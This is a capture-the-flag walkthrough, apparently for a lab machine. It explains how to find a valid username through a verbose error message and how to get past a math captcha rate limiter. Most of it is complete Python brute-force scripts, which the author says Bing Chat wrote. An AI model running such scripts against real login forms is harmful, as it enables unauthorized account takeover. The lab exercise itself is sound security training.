# What do we know?

- Task 1 provides us with information about a login form and a rate limiter. This suggests that we cannot use a standard tool like Hydra to brute force the login form.

- We are also given a zip file to download, which contains two text files:
  - `usernames.txt`
  - `passwords.txt`

  This indicates that the username and password needed to solve this challenge can be found in these files. Given that there are over 800 usernames and 1500 passwords, it is clear that manually trying all possible combinations of over 1 million username/password pairs is not feasible.
  
- Additionally, we know that the login form is accessible at `http://MACHINE_IP`.

# Examine the login form
Start the victim machine and also set up your AttackBox by: 
- Start a Web browser (like Firefox) 
- Start Burp Suite (Community Edition is good enough)
- Set the proxy tool in the browser (e.g. [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)) to go through Burp

With Burp Suite we will more easily be able to view the traffic between the web browser and the web server. Especially, we want to intercept the post we make when trying to login.

First, visit the webpage in your browser and try to log in using some username and password, such as "user1" and "pwd". 

![image](https://user-images.githubusercontent.com/6702854/236620094-bb825a71-0451-4eef-abf1-927bfb8f9ccd.png)


You should notice that an error message appears stating ``The user 'user1' does not exist``. It is considered bad practice to inform potential hackers that a specific username does not exist, as this makes it easier for them to determine when they have found the correct username. 

So to speed up brute force cracking of the login form, we should first try to find the username without trying all the password (this is also mentionend in the Hint in Task 2). This bad practice has reduced the number of tries from over a million to less than 2000 (first 800 usernames to brute force, and then try the 1500 passwords on the found username). Still too many to do manually, if you aren't very determined 😄

## Captcha

Press the "Log in"-button about ten times, and you will see that ``Too many bad login attempts!`` and a Captcha appears. For every login we need to solve a mathematical puzzle. This is the rate limiter that was mentioned in Task 1. We cannot brute force this with Hydra and after a quick search on Google I did not find any other tools that does this automatically.

![image](https://user-images.githubusercontent.com/6702854/236621346-f88dfee3-1ba9-428c-8dde-6dcd52157071.png)

Make sure that you try to login with a correct CHAPTA, so we can intercept all kinds of requests from the login form.

## Request Bodies
In Burp under Target/Site Map and the URL for the /login page, you should now see at least two kinds of POST-requests from the login form

![image](https://user-images.githubusercontent.com/6702854/236622180-2847a268-c159-42f8-afb5-283860065ecd.png)

Clicking on those requests we get the full POST header:

```
POST /login HTTP/1.1
<snip>
username=user1&password=pwd
```
and
```
POST /login HTTP/1.1
<snip>
username=user1&password=pwd&captcha=656
```

These are very useful in our next step!

# Creating our own brute force tool
It seems that the easiest way is to create our own brute force tool to solve this challenge. The approach is to use Python and use [BingChat](https://www.bing.com/search?q=Bing+AI&showconv=1&FORM=hpcodx) to help us speed up the coding of this application. 

> BingChat only requires a Microsoft-account, such as hotmail.com or outlook.com.

> Please not that the response from the BingChat AI will probably differ with the same prompt used again

``prompt > Write a Python function that takes a web response text and searches for a captcha in the following format "671 * 50 = ?", and calculates and returns the result. The operator can be all of the four basic operators.``

```
import re

def solve_captcha(response_text: str) -> int:
    match = re.search(r'(\d+)\s*([\+\-\*\/])\s*(\d+)\s*=\s*\?', response_text)
    if match:
        a = int(match.group(1))
        operator = match.group(2)
        b = int(match.group(3))
        if operator == '+':
            return a + b
        elif operator == '-':
            return a - b
        elif operator == '*':
            return a * b
        elif operator == '/':
            return a / b
    return None
```

Great! We have a method that can parse and calculate the mathematical Captcha.


``prompt > Use the function above in a program that connects to http://serverip/login and POSTs username and password in this format "username=user1&password=pwd" until the response does not contain "does not exist". If the response contains "Invalid captcha" read the captcha from the response, calculate the value and POST again with format "username=user1&password=pwd&captcha=theCaptcha" ``

```
import requests

url = 'http://serverip/login'
username = 'user1'
password = 'pwd'

while True:
    data = {'username': username, 'password': password}
    response = requests.post(url, data=data)
    response_text = response.text
    if 'does not exist' not in response_text:
        break
    if 'Invalid captcha' in response_text:
        captcha_value = solve_captcha(response_text)
        data['captcha'] = captcha_value
        response = requests.post(url, data=data)
        response_text = response.text
        if 'does not exist' not in response_text:
            break
```         
            
prompt > read username from a file called usernames.txt and use these in the loop to test usernames

```
import requests

url = 'http://serverip/login'
password = 'pwd'

with open('usernames.txt', 'r') as f:
    usernames = f.read().splitlines()

for username in usernames:
    data = {'username': username, 'password': password}
    response = requests.post(url, data=data)
    response_text = response.text
    if 'does not exist' not in response_text:
        print(f'Successful login with username: {username}')
        break
    if 'Invalid captcha' in response_text:
        captcha_value = solve_captcha(response_text)
        data['captcha'] = captcha_value
        response = requests.post(url, data=data)
        response_text = response.text
        if 'does not exist' not in response_text:
            print(f'Successful login with username: {username}')
            break
```

OK, this codeis almost right. We just have to add ``and 'Invalid captcha' not in response_text:`` to the first if-statement. 
The last print-statement should read ``print(f'Valid username: {username} found') ``

So the complete code go brute force the username should look like this:

```
import requests
import re

def solve_captcha(response_text: str) -> int:
    match = re.search(r'(\d+)\s*([\+\-\*\/])\s*(\d+)\s*=\s*\?', response_text)
    if match:
        a = int(match.group(1))
        operator = match.group(2)
        b = int(match.group(3))
        if operator == '+':
            return a + b
        elif operator == '-':
            return a - b
        elif operator == '*':
            return a * b
        elif operator == '/':
            return a / b
    return None

url = 'http://serverip/login'
password = 'pwd'

with open('usernames.txt', 'r') as f:
    usernames = f.read().splitlines()

for username in usernames:
    data = {'username': username, 'password': password}
    response = requests.post(url, data=data)
    response_text = response.text
    if 'does not exist' not in response_text and 'Invalid captcha' not in response_text:
        print(f'Successful login with username: {username}')
        break
    if 'Invalid captcha' in response_text:
        captcha_value = solve_captcha(response_text)
        data['captcha'] = captcha_value
        response = requests.post(url, data=data)
        response_text = response.text
        if 'does not exist' not in response_text:
            print(f'Successful login with username: {username}')
            break
```
You need to change she ``serverip``, and perhaps also the path to the ``usernames.txt`` file.

Save this code as bf_username.py and run with python bf_username.py 
This will give us the username: natalie after a couple of minutes of execution.

## Get the wrong password respose
Go back to the web page and manually enter natalie as username and something as password. We need to do this to see whats the page returns on wrong password.

![image](https://user-images.githubusercontent.com/6702854/236632504-dc9674c8-bc76-4456-9e84-28de8195fe26.png)

We see that the response contains the string "Invalid password for user". 

prompt > change the program to use the username "natalie" and read the passwords from a file passwords.txt. Try the passwords until the response does not contain "Invalid password for user", instead of "does not exist"

```
import requests

url = 'http://serverip/login'
username = 'natalie'

with open('passwords.txt', 'r') as f:
    passwords = f.read().splitlines()

for password in passwords:
    data = {'username': username, 'password': password}
    response = requests.post(url, data=data)
    response_text = response.text
    if 'Invalid password for user' not in response_text:
        print(f'Successful login with password: {password}')
        break
    if 'Invalid captcha' in response_text:
        captcha_value = solve_captcha(response_text)
        data['captcha'] = captcha_value
        response = requests.post(url, data=data)
        response_text = response.text
        if 'Invalid password for user' not in response_text:
            print(f'Successful login with password: {password}')
            break
```

As before, the code is not perfekt, but if we add and 'Invalid captcha' not in response_text: to the first if-statement we are good to go.
The complete code looks like this:

```
import requests
import re

def solve_captcha(response_text: str) -> int:
    match = re.search(r'(\d+)\s*([\+\-\*\/])\s*(\d+)\s*=\s*\?', response_text)
    if match:
        a = int(match.group(1))
        operator = match.group(2)
        b = int(match.group(3))
        if operator == '+':
            return a + b
        elif operator == '-':
            return a - b
        elif operator == '*':
            return a * b
        elif operator == '/':
            return a / b
    return None

url = 'http://serverip/login'
username = 'natalie'

with open('passwords.txt', 'r') as f:
    passwords = f.read().splitlines()

for password in passwords:
    data = {'username': username, 'password': password}
    response = requests.post(url, data=data)
    response_text = response.text
    if 'Invalid password for user' not in response_text and 'Invalid captcha' not in response_text:
        print(f'Successful login with password: {password}')
        break
    if 'Invalid captcha' in response_text:
        captcha_value = solve_captcha(response_text)
        data['captcha'] = captcha_value
        response = requests.post(url, data=data)
        response_text = response.text
        if 'Invalid password for user' not in response_text:
            print(f'Successful login with password: {password}')
            break
```

Save the code in a file like bf_password.py and run it with python bf_password.py.
After a couple of minutes you have the password.

Use the username and password to log in manually through the web page and get your well deserved flag!

